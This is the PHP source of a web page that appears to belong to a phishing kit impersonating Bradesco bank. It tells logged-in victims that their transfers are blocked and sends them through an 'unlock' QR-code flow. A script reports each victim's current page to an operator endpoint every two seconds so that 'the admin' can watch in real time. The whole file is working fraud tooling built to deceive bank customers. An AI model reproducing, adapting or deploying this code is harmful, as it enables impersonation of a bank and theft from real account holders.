<?php
// transferencias.php
session_start();

if (!isset($_SESSION['client_id'])) {
    header('Location: /index.php');
    exit;
}

// Ativa o item Transferências no menu
$menuAtivo = 'transferencias';

// Carrega o QRCode (validação digital) se acionado
if (isset($_GET['acao']) && $_GET['acao'] === 'qrcode') {
    include 'qrcodeted.php';
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
    <link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {margin:0;font-family:'Montserrat',sans-serif;background:#f5f6f7;color:#222;min-height:100vh;display:flex;flex-direction:column;}
        .transf-blocked-wrapper {
            flex:1;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:40px 20px;
        }
        .transf-card {
            width:100%;
            max-width:520px;
            background:#ffffff;
            border:1px solid #e2e2e2;
            border-radius:14px;
            box-shadow:0 4px 18px rgba(0,0,0,0.06);
            padding:42px 40px 36px;
            position:relative;
            overflow:hidden;
        }
        .transf-card:before {
            content:"";
            position:absolute;
            inset:0;
            background:linear-gradient(135deg,rgba(215,30,40,0.07),rgba(162,31,143,0.07));
            opacity:.55;
            pointer-events:none;
        }
        .transf-card h1 {
            margin:0 0 18px;
            font-size:26px;
            font-weight:700;
            position:relative;
            z-index:2;
            letter-spacing:.4px;
            color:#a40028;
        }
        .transf-card p {
            margin:0 0 26px;
            font-size:14px;
            line-height:1.55;
            position:relative;
            z-index:2;
            color:#444;
        }
        .transf-card p strong {color:#222;}
        .transf-card .status-pill {
            display:inline-block;
            background:#d71e28;
            color:#fff;
            font-size:11px;
            letter-spacing:.5px;
            font-weight:600;
            padding:5px 12px 4px;
            border-radius:30px;
            text-transform:uppercase;
            margin-bottom:14px;
            position:relative;
            z-index:2;
        }
        .transf-card button {
            position:relative;
            z-index:2;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            gap:8px;
            background:linear-gradient(90deg,#d71e28,#a41f8f);
            border:none;
            color:#fff;
            font-size:15px;
            font-weight:600;
            padding:14px 30px;
            border-radius:8px;
            cursor:pointer;
            box-shadow:0 4px 12px rgba(0,0,0,0.15);
            transition:box-shadow .2s,transform .2s;
        }
        .transf-card button:hover {
            box-shadow:0 6px 16px rgba(0,0,0,0.22);
            transform:translateY(-2px);
        }
        .transf-card button:active {
            transform:translateY(0);
            box-shadow:0 3px 10px rgba(0,0,0,0.18);
        }
        .transf-card small {
            display:block;
            margin-top:18px;
            font-size:11px;
            color:#777;
            position:relative;
            z-index:2;
        }

        @media (max-width:600px){
            .transf-card {padding:34px 26px 30px;}
            .transf-card h1 {font-size:22px;}
            .transf-card p {font-size:13px;}
        }
    </style>
</head>
<body>

<?php include 'header.php'; ?>
<?php include 'menu.php'; ?>

<div class="transf-blocked-wrapper">
    <div class="transf-card">
        <span class="status-pill">TRANSFERÊNCIAS BLOQUEADAS</span>
        <h1>Função de Transferências indisponível</h1>
        <p>
            As operações de <strong>Transferências</strong> da sua conta estão <strong>temporariamente bloqueadas</strong>.
            Para voltar a realizar TEDs, DOCs ou movimentações entre contas, é necessário efetuar o processo
            de desbloqueio.<br><p>Clique no botão abaixo e siga as orientações.
        </p>

        <!-- ÚNICO botão correto -->
        <button id="btnDesbloquearTransf" type="button">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff" aria-hidden="true">
                <path d="M17 8V7a5 5 0 0 0-10 0v1H5v14h14V8h-2Zm-8-1a3 3 0 0 1 6 0v1H9V7Zm8 13H7V10h10v10Zm-5-3a2 2 0 1 0 0-4 2 2 0 0 0 0 4Z"/>
            </svg>
            Desbloquear
        </button>

        <small>Se tiver dúvidas sobre o desbloqueio, fale com a BIA no canto inferior direito.</small>
    </div>
</div>

<?php include 'footer.php'; ?>
<?php include 'chat.php'; ?>

<script>
// Redireciona para o fluxo do QR Code (validação digital)
document.getElementById('btnDesbloquearTransf').addEventListener('click', () => {
    window.location.href = '/transferencias.php?acao=qrcode';
});
</script>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'transferencias.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>
